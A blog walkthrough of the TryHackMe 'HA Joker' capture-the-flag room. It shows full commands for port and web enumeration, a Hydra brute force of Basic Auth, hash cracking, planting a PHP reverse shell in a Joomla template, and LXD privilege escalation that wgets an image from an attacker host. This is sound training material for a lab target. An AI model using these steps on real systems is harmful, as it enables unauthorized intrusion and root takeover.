HA Joker CTF: From Web Enumeration to Root Through LXD

MY
Mohamed Yassine Bougamra
TryHackMe CTF Web Enumeration Privilege Escalation
⚠️ Spoiler warning: this post contains the complete solution for the HA Joker CTF room. Try the room yourself first if you want to solve it without hints.

HA Joker is a medium-difficulty boot2root room on TryHackMe. What makes it enjoyable is the way the attack develops: a small leak in the web application leads to credentials, those credentials open up more of the site, and the final foothold becomes a privilege-escalation exercise involving LXD.

This is the route I followed, starting with a full port scan and ending with access to the host filesystem as root.

Reconnaissance and Service Enumeration

I began by scanning every TCP port so I could see the complete attack surface instead of relying on the default port list.

recon.shnmap
nmap -sS -sV -p- -O -T4 <target-ip>

The scan returned three open ports:

Port 80 was accessible without authentication, so that was the natural place to begin.

Web Enumeration on Port 80

I first opened the site manually, then used a few content-discovery tools to compare results rather than trusting a single scan.

content-discovery.shweb
dirsearch -u http://<target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
nikto -h http://<target-ip>

Two findings stood out:

  • phpinfo.php, which exposed PHP configuration information.
  • secret.txt, which disclosed the username joker.

That gave me a valid username. The next question was whether it could be used against the HTTP Basic Authentication prompt on port 8080.

Brute-Forcing HTTP Basic Authentication

With the username confirmed, I ran a targeted Hydra attack against port 8080 using the RockYou wordlist.

hydra.shcredentials
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 <target-ip> http-get /

Hydra found a valid password, which gave me authenticated access to the service on port 8080.

Enumerating the Authenticated Service

I repeated the web checks with the recovered credentials. This time the scanner could reach content hidden behind the login.

authenticated-enum.shnikto
nikto -h http://<target-ip>:8080 -id <user>:<password>

The important results were robots.txt and backup.zip. The archive was password-protected, so before trying anything noisy I tested the password already found for the Basic Auth login. It worked, which confirmed that the target was reusing credentials.

Inside the archive was a SQL dump. It contained database export statements, including an administrator account and its password hash.

Cracking the Administrator Hash

I saved the hash to a separate file and worked on it offline with John the Ripper.

crack.shjohn
john <hash_file> --wordlist=/usr/share/wordlists/rockyou.txt

Getting Remote Code Execution Through the CMS

The recovered password worked for the administrator account of the CMS running on port 8080. After logging in, I found a file manager with the usual Joomla-style template layout.

The file I used was:

target-filephp
templates/beez3/error.php

Because the file was already part of the template and could be edited from the CMS, it was a convenient place to put a PHP reverse shell. I used the PentestMonkey PHP reverse shell, changing its IP and PORT values to point to my machine.

On my machine, I started a listener:

listener.shnetcat
nc -lvp 8080

Then I requested the modified file to trigger the connection:

triggerhttp
http://<target-ip>:8080/templates/beez3/error.php?cmd=id

Stabilizing the Shell

The first shell was basic, so I started with a few situational-awareness checks.

shell-checks.shshell
id
whoami
pwd
ls

After confirming the current user and working directory, I upgraded the raw netcat connection to an interactive TTY.

tty.shshell
python3 -c 'import pty; pty.spawn("/bin/bash")'

Privilege Escalation Through LXD

While checking the account and its group memberships, I found that the user belonged to the lxd group. That is a serious misconfiguration: a member can create a privileged container and mount the host filesystem inside it.

I built a small Alpine image on the attacker machine using the community builder:

build-image.shalpine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

When initializing LXD, the storage backend needs to be set to dir for this approach to work reliably. I then served the resulting archive over HTTP:

serve-image.shhttp
sudo python3 -m http.server 80

From the target shell, I downloaded the image and created a privileged container with the host root mounted at /mnt/root.

lxd-root.shprivilege-escalation
cd /tmp
wget http://<attacker-ip>:80/alpine-v3.12-x86_64-20200923_0009.tar.gz
lxc image import ./alpine-v3.12-x86_64-20200923_0009.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

Final Flag

Once inside the container, I could browse the mounted host filesystem. The root directory was available at /mnt/root/root/, where final.txt confirmed that the privilege-escalation path had worked.

Takeaways

This room is a good reminder that an attack chain is often built from several small mistakes rather than one dramatic vulnerability. An exposed username, reused credentials, an editable CMS file, and membership in a privileged group were enough to move from unauthenticated web access to full control of the host.

If you want to practice the same chain, try HA Joker on TryHackMe before reading the walkthrough.
